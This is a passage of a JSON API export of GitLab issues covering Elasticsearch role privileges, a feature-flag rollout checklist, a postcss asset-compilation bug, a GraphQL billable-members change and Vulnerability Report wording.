Pandya","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/411701/avatar.png","web_url":"https://gitlab.com/kushalpandya"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353853","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353853","notes":"https://gitlab.com/api/v4/projects/278964/issues/353853/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353853/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353853","relative":"#353853","full":"gitlab-org/gitlab#353853"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103072260,"iid":353847,"project_id":278964,"title":"Update Advanced Search docs with minimum requirements for roles","description":"\u003c!-- This template is a great use for issues that are feature::additions or technical tasks for larger issues.--\u003e\n\n### Proposal\n\nWe currently don't have any guidelines for customers who are configuring Advanced Search and want to be mindful of security best practices. When providing an Elasticsearch username, we assume it's an administrator and has read/write access but we don't explicitly define what type of user role should be used or what type of cluster and index privileges are required. In my testing it's not required to use the built-in administrator role, but if you are creating an admin-like role to be used for the purposes of supplying it to GitLab for integration it would be useful to know what you should need at minimum.\n\nWe should update our documentation to include the required list of security privileges a user must have for proper elasticsearch functionality. We should also consider documenting how to scope your roles to specific indexes for those who are security minded.\n\nSome immediate notes:\n\n- `cluster:monitor` and `index:all` for index pattern `gitlab-*`\n- `write` access is required `to perform all write operations to documents, which includes the permission to index, update, and delete documents as well as performing bulk operations, and allows the dynamic mapping updates as a result of these.`\n\n\n**Elasticsearch Documentation**:\n\n- https://www.elastic.co/guide/en/elasticsearch/reference/7.17/defining-roles.html\n- https://www.elastic.co/guide/en/elasticsearch/reference/7.17/security-privileges.html#privileges-list-indices\n\n**Slack convo for context:**\n- https://gitlab.slack.com/archives/C3TMLK465/p1645807188965549\n\n**ZD Ticket:**\n- https://gitlab.zendesk.com/agent/tickets/270650\n\n\u003c!-- Label reminders\nUse the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n--\u003e","state":"closed","created_at":"2022-02-25T20:50:17.222Z","updated_at":"2022-05-30T15:59:05.594Z","closed_at":"2022-04-25T21:55:40.649Z","closed_by":{"id":5537005,"username":"cleveland","name":"Cleveland Bledsoe Jr","state":"active","avatar_url":"https://secure.gravatar.com/avatar/9b3b602b16b5453efe7c1190e8ae558e?s=80\u0026d=identicon","web_url":"https://gitlab.com/cleveland"},"labels":["Category:Global Search","advanced search","customer","devops::data_stores","documentation","group::global search","section::enablement","type::maintenance","workflow::planning breakdown"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":5537005,"username":"cleveland","name":"Cleveland Bledsoe Jr","state":"active","avatar_url":"https://secure.gravatar.com/avatar/9b3b602b16b5453efe7c1190e8ae558e?s=80\u0026d=identicon","web_url":"https://gitlab.com/cleveland"},"type":"ISSUE","assignee":null,"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353847","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353847","notes":"https://gitlab.com/api/v4/projects/278964/issues/353847/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353847/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":"https://gitlab.com/api/v4/projects/278964/issues/275993"},"references":{"short":"#353847","relative":"#353847","full":"gitlab-org/gitlab#353847"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3885,"epic":{"id":80344,"iid":3885,"title":"Global Search Documentation Refresh","url":"/groups/gitlab-org/-/epics/3885","group_id":9970},"iteration":null,"health_status":null},{"id":103062180,"iid":353836,"project_id":278964,"title":"[Feature flag] Roll out status_checks_add_status_field flag","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nRoll out the changes behind `status_checks_add_status_field` flag. This should be done during 15.0 as it introduces a breaking change to the REST API. \n\n## Owners\n\n- Team: ~\"group::compliance\" \n- Most appropriate slack channel to reach out to: `#g_manage_compliance`\n- Best individual to reach out to: @mwoolf / @dennis\n- PM: @sam.white \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\n* It will be possible to explictly fail an external status check.\n* The `GET /projects/:id/merge_requests/:iid/status_checks` endpoint will now return `passed` rather than `approved` for passed status checks. It can also now return `failed`.\n\n### When is the feature viable?\n\n* No settings need to be configured.\n\n### What might happen if this goes wrong?\n\n* Any unexpected bugs around the status of external status checks.\n\n### What can we monitor to detect problems with this?\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n_Consider mentioning checks for 5xx errors or other anomalies like an increase in redirects \n(302 HTTP response status)_\n\n### What can we check for monitoring production after rollouts?\n\n_Consider adding links to check for Sentry errors, Production logs for 5xx, 302s, etc._\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true --dev`\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --project=gitlab-com/www-gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --group=gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e \u003cfeature-flag-name\u003e true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [x] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [x] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [x] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [x] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [x] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\nYou can either [create a follow-up issue for Feature Flag Cleanup](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) or use the checklist below in this same issue.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [x] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [x] Remove all references to the feature flag from the codebase.\n    - [x] Remove the YAML definitions for the feature from the repository.\n    - [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [x] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [x] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [x] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [x] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [x] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [x] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [x] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set \u003cfeature-flag-name\u003e false\n```","state":"closed","created_at":"2022-02-25T15:38:47.633Z","updated_at":"2022-05-17T18:26:10.858Z","closed_at":"2022-05-13T20:29:01.980Z","closed_by":{"id":10467142,"username":"harsimarsandhu","name":"Harsimar Sandhu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10467142/avatar.png","web_url":"https://gitlab.com/harsimarsandhu"},"labels":["breaking change","devops::manage","feature flag","feature::addition","group::compliance","priority::1","release post item","section::dev","type::feature","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":10467142,"username":"harsimarsandhu","name":"Harsimar Sandhu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10467142/avatar.png","web_url":"https://gitlab.com/harsimarsandhu"}],"author":{"id":5833976,"username":"mwoolf","name":"Max Woolf","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c8af02fcb6678db41bd8d3a29f9c1d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/mwoolf"},"type":"ISSUE","assignee":{"id":10467142,"username":"harsimarsandhu","name":"Harsimar Sandhu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10467142/avatar.png","web_url":"https://gitlab.com/harsimarsandhu"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353836","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":37,"completed_count":27},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"27 of 37 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353836","notes":"https://gitlab.com/api/v4/projects/278964/issues/353836/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353836/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353836","relative":"#353836","full":"gitlab-org/gitlab#353836"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103047983,"iid":353824,"project_id":278964,"title":"Cannot find module 'postcss' in source install update when compiling assets","description":"### Summary\n\nWhile trying to upgrade our test instance of GitLab from 14.6.3 to 14.8.1 via the scripted workflow we have used for that upgrade many times in the past (script based on upgrade instructions, I verified that the instructions still say the same) I encountered a problem in the asset compilation step. it displays an error \"Cannot find module 'postcss'. It also still exits with a successful exit code despite that error.\n\n### Steps to reproduce\n\n* Source install according to install guide\n* Update according to update guide for source installs\n* Encounter missing module error in asset compilation step\n\n### What is the current *bug* behavior?\n\nMissing module 'postcss'\n\n```\n`gitlab:assets:fix_urls` finished in 0.522036264 seconds\ninternal/modules/cjs/loader.js:905\n  throw err;\n  ^\n\nError: Cannot find module 'postcss'\nRequire stack:\n- /var/git/gitlabhq/scripts/frontend/check_page_bundle_mixins_css_for_sideeffects.js\n    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:902:15)\n    at Function.Module._load (internal/modules/cjs/loader.js:746:27)\n    at Module.require (internal/modules/cjs/loader.js:974:19)\n    at require (internal/modules/cjs/helpers.js:101:18)\n    at Object.\u003canonymous\u003e (/var/git/gitlabhq/scripts/frontend/check_page_bundle_mixins_css_for_sideeffects.js:13:13)\n    at Module._compile (internal/modules/cjs/loader.js:1085:14)\n    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1114:10)\n    at Module.load (internal/modules/cjs/loader.js:950:32)\n    at Function.Module._load (internal/modules/cjs/loader.js:790:12)\n    at Function.executeUserEntryPoint [as runMain] (internal/modules/run_main.js:75:12) {\n  code: 'MODULE_NOT_FOUND',\n  requireStack: [\n    '/var/git/gitlabhq/scripts/frontend/check_page_bundle_mixins_css_for_sideeffects.js'\n  ]\n}\n`gitlab:assets:check_page_bundle_mixins_css_for_sideeffects` finished in 0.134506489 seconds\n```\n\n### What is the expected *correct* behavior?\n\nAll required modules should be installed.\n\n### Output of checks\n\nThe checks do not display any errors when running after this.\nLogin fails on the 2FA step, the browser console mentions some scripts that were blocked because they are mime-type text/plain, this might be unrelated to this error.\n\n#### Results of GitLab environment info\n\n\u003c!--  Input any relevant GitLab environment information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to GitLab environment info\u003c/summary\u003e\n\n\u003cpre\u003e\n\n\nSystem information\nSystem:         Debian 10\nCurrent User:   git\nUsing RVM:      no\nRuby Version:   2.7.3p183\nGem Version:    3.1.6\nBundler Version:2.3.8\nRake Version:   13.0.6\nRedis Version:  5.0.14\nSidekiq Version:6.4.0\nGo Version:     go1.16.8 linux/amd64\n\nGitLab information\nVersion:        14.8.1\nRevision:       479d579719c\nDirectory:      /var/git/gitlabhq\nDB Adapter:     PostgreSQL\nDB Version:     13.6\nURL:            https://gitlab-dev.saltation.de\nHTTP Clone URL: https://gitlab-dev.saltation.de/some-group/some-project.git\nSSH Clone URL:  git@gitlab-dev.saltation.de:some-group/some-project.git\nUsing LDAP:     no\nUsing Omniauth: no\n\nGitLab Shell\nVersion:        13.23.2\nRepository storage paths:\n- default:      /var/git/repositories\nGitLab Shell path:              /var/git/gitlab-shell\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n#### Results of GitLab application Check\n\n\u003c!--  Input any relevant GitLab application check information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to the GitLab application check\u003c/summary\u003e\nNote: the init script matches the one in the repository apart from the app_root setting.\n\u003cpre\u003e\n\nChecking GitLab subtasks ...\n\nChecking GitLab Shell ...\n\nGitLab Shell: ... GitLab Shell version \u003e= 13.23.2 ? ... OK (13.23.2)\nRunning /var/git/gitlab-shell/bin/check\nInternal API available: OK\nRedis available via internal API: OK\ngitlab-shell self-check successful\n\nChecking GitLab Shell ... Finished\n\nChecking Gitaly ...\n\nGitaly: ... default ... OK\n\nChecking Gitaly ... Finished\n\nChecking Sidekiq ...\n\nSidekiq: ... Running? ... yes\nNumber of Sidekiq processes (cluster/worker) ... 1/1\n\nChecking Sidekiq ... Finished\n\nChecking Incoming Email ...\n\nIncoming Email: ... Reply by email is disabled in config/gitlab.yml\n\nChecking Incoming Email ... Finished\n\nChecking LDAP ...\n\nLDAP: ... LDAP is disabled in config/gitlab.yml\n\nChecking LDAP ... Finished\n\nChecking GitLab App ...\n\nDatabase config exists? ... yes\nAll migrations up? ... yes\nDatabase contains orphaned GroupMembers? ... no\nGitLab config exists? ... yes\nGitLab config up to date? ... yes\nLog directory writable? ... yes\nTmp directory writable? ... yes\nUploads directory exists? ... yes\nUploads directory has correct permissions? ... yes\nUploads directory tmp has correct permissions? ... skipped (no tmp uploads folder yet)\nSystemd unit files or init script exist? ... yes\nSystemd unit files or init script up-to-date? ... no\n  Try fixing it:\n  Install the Service\n  For more information see:\n  doc/install/installation.md in section \"Install the Service\"\n  Please fix the error above and rerun the checks.\nProjects have namespace: ...\n7/3 ... yes\n135/5 ... yes\n[... lots more number pairs, all with yes]\nRedis version \u003e= 5.0.0? ... yes\nRuby version \u003e= 2.7.2 ? ... yes (2.7.3)\nGit user has default SSH configuration? ... yes\nActive users: ... 60\nIs authorized keys file accessible? ... yes\nGitLab configured to store new projects in hashed storage? ... yes\nAll projects are in hashed storage? ... yes\n\nChecking GitLab App ... Finished\n\n\nChecking GitLab subtasks ... Finished\n\u003c/pre\u003e\n\u003c/details\u003e\n\n### Possible fixes\n\nPresumably the issue is that\n\nscripts/frontend/check_page_bundle_mixins_css_for_sideeffects.js\n\nuses postcss but that module is not installed by an earlier step.","state":"closed","created_at":"2022-02-25T11:25:36.419Z","updated_at":"2022-03-25T17:26:18.457Z","closed_at":"2022-03-25T17:26:18.393Z","closed_by":{"id":447038,"username":"vitallium","name":"Vitaly Slobodin","state":"active","avatar_url":"https://secure.gravatar.com/avatar/74b3243cfcfbfac1f022b78ab505e8d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/vitallium"},"labels":["frontend","missed:14.9","type::bug","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":447038,"username":"vitallium","name":"Vitaly Slobodin","state":"active","avatar_url":"https://secure.gravatar.com/avatar/74b3243cfcfbfac1f022b78ab505e8d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/vitallium"}],"author":{"id":697028,"username":"mhoermann","name":"Matthias Hörmann","state":"active","avatar_url":"https://secure.gravatar.com/avatar/d099eefa381e2da74d20486a2d6033bf?s=80\u0026d=identicon","web_url":"https://gitlab.com/mhoermann"},"type":"ISSUE","assignee":{"id":447038,"username":"vitallium","name":"Vitaly Slobodin","state":"active","avatar_url":"https://secure.gravatar.com/avatar/74b3243cfcfbfac1f022b78ab505e8d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/vitallium"},"user_notes_count":19,"merge_requests_count":0,"upvotes":3,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353824","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353824","notes":"https://gitlab.com/api/v4/projects/278964/issues/353824/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353824/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353824","relative":"#353824","full":"gitlab-org/gitlab#353824"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103040036,"iid":353821,"project_id":278964,"title":"Follow-up from \"ci: Build workhorse binaries and upload/download as generic package\"","description":"The following discussion from !79766 should be addressed:\n\n- [ ] @rymai started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/79766#note_855130947): \n\n    \u003e ```suggestion:-0+0\n    \u003e     - 'gitlab_workhorse_archive_doesnt_exist || { echoinfo \"INFO: Exiting early as package exists.\"; exit 0; }'\n    \u003e ```\n    \u003e \n    \u003e I'll fix that on Monday. :face_palm_tone2: (see https://gitlab.com/gitlab-org/gitlab/-/jobs/2136191690, where the error is ignored hopefully).","state":"closed","created_at":"2022-02-25T09:01:17.004Z","updated_at":"2022-03-16T11:24:04.682Z","closed_at":"2022-03-14T18:29:25.955Z","closed_by":{"id":128633,"username":"rymai","name":"Rémy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"labels":["Engineering Productivity","maintenance::pipelines","type::maintenance"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":128633,"username":"rymai","name":"Rémy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"}],"author":{"id":128633,"username":"rymai","name":"Rémy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"type":"ISSUE","assignee":{"id":128633,"username":"rymai","name":"Rémy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"user_notes_count":0,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353821","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353821","notes":"https://gitlab.com/api/v4/projects/278964/issues/353821/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353821/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353821","relative":"#353821","full":"gitlab-org/gitlab#353821"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103022364,"iid":353814,"project_id":278964,"title":"Extend Group API to get billable members count for a given plan","description":"`Group` GraphQL endpoint currently exposes `billableMembersCount` which includes any guest members in the count.\n\nThis needs to be extended to support a parameter to accept the requested plan (`requestedHostedPlan`) which can be used to get the billable members count excluding guests based on the plan provided.\n\nCreated as a dependency from #352231+\n\n**Before**\n\n```{\n  group(fullPath: \"full_path\") {\n    id\n    billableMembersCount\n  }\n}\n```\n\n\n**After**\n\nShould work without `requestedHostedPlan` param:\n\n```\n{\n  group(fullPath: \"full_path\") {\n    id\n    billableMembersCount\n  }\n}\n```\n\nAnd with `requestedHostedPlan` param:\n\n```\n{\n  group(fullPath: \"full_path\") {\n    id\n    billableMembersCount(requestedHostedPlan: \"plan_code\")\n  }\n}\n```","state":"closed","created_at":"2022-02-25T01:27:07.431Z","updated_at":"2022-05-30T09:20:10.744Z","closed_at":"2022-03-10T04:28:45.031Z","closed_by":{"id":10325315,"username":"vvempati","name":"Vamsi Vempati","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10325315/avatar.png","web_url":"https://gitlab.com/vvempati"},"labels":["Category:Purchase","GraphQL","Unplanned","backend","devops::fulfillment","documentation","frontend","group::purchase","section::fulfillment","type::feature","workflow::production"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":10325315,"username":"vvempati","name":"Vamsi Vempati","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10325315/avatar.png","web_url":"https://gitlab.com/vvempati"}],"author":{"id":10325315,"username":"vvempati","name":"Vamsi Vempati","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10325315/avatar.png","web_url":"https://gitlab.com/vvempati"},"type":"ISSUE","assignee":{"id":10325315,"username":"vvempati","name":"Vamsi Vempati","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10325315/avatar.png","web_url":"https://gitlab.com/vvempati"},"user_notes_count":16,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353814","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353814","notes":"https://gitlab.com/api/v4/projects/278964/issues/353814/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353814/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353814","relative":"#353814","full":"gitlab-org/gitlab#353814"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103008141,"iid":353788,"project_id":278964,"title":"Clarify language about pipelines on Vulnerability Reports","description":"### Problem\n\nThe text displayed at the top of Vulnerability Report pages can be confusing. Today, it says:\n\n\u003e The Vulnerability Report shows the results of the latest successful pipeline on your project's default branch, as well as vulnerabilities from your latest container scan. [Learn more](https://gitlab.com/help/user/application_security/security_dashboard/index).\n\nThis can mislead users to think the Vulnerability Report _only_ includes what was found in the latest pipeline run against the `default` branch rather than a full history as it really does. Additionally, the `Learn more` link points to the docs page for Security Dashboards, not Vulnerability Reports.\n\n### Proposal\n\nChange the text to more clearly reflect what the Vulnerability Report pages actually show. Not only is it a cumulative historic record of all vulnerabilities ever detected on the default branch, it technically is the result of successful pipeline security _jobs_; a pipeline does not have to complete successfully for us to ingest vulnerabilities. Also change the `Learn more` link to the [Vulnerability Report documentation page](https://docs.gitlab.com/ee/user/application_security/vulnerability_report/).\n\nThe new copy should read:\n\n\u003e The Vulnerability Report shows results of successful scans on your project's default branch, manually added vulnerability records, and vulnerabilities found from scanning operational environments. [Learn more](https://docs.gitlab.com/ee/user/application_security/vulnerability_report/).","state":"closed","created_at":"2022-02-24T17:21:29.197Z","updated_at":"2023-01-05T03:55:03.448Z","closed_at":"2023-01-05T03:55:03.406Z","closed_by":{"id":480804,"username":"thiagocsf","name":"Thiago Figueiró","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480804/avatar.png","web_url":"https://gitlab.com/thiagocsf"},"labels":["Category:Vulnerability Management","SUS::Impacting","Technical Writing","devops::govern","documentation","group::threat insights","missed:14.10","section::sec","severity::4","type::maintenance","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[],"author":{"id":4708748,"username":"matt_wilson","name":"Matt 